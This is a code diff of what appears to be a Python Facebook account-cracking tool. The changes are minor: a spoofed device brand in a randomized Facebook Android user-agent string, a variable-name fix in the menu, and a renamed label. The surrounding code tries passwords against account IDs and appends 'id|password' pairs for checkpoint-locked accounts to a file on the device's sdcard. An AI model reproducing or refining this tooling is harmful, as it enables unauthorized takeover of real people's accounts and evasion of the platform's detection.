@@ -53,7 +53,7 @@ def CEN():
 	density = random.choice(['2.0', '2.5', '3.0'])
 	width = random.choice(["720", "1080", "1280"])
 	height = random.choice(["720", "1080", "1280", "1440", "1920"])
-	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
+	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
 	return ua
 #__________________LOGO____________#
 logo=(f"""
@@ -79,7 +79,7 @@ def menu():
     xen = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
     if xen in ['1']:
         file()
-    elif sex in ['2']:
+    elif xen in ['2']:
         tsu()
     elif xen in ['3']:
         os.system('xdg-open https://www.facebook.com/CenT.aep');menu()
@@ -321,7 +321,7 @@ def M1(ids,names,psd):
                 ok.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                #print(f'\r\r{A}[{M}CEN-PODLOCK{A}]{M} {ids} {A}|{M} {pas}')
+                #print(f'\r\r{A}[{M}CENT-PODLOCK{A}]{M} {ids} {A}|{M} {pas}')
                 open('/sdcard/CENT-FILE-PODLOCK.txt','a').write(ids+'|'+pas+'\n')
             else:continue
         loop+=1
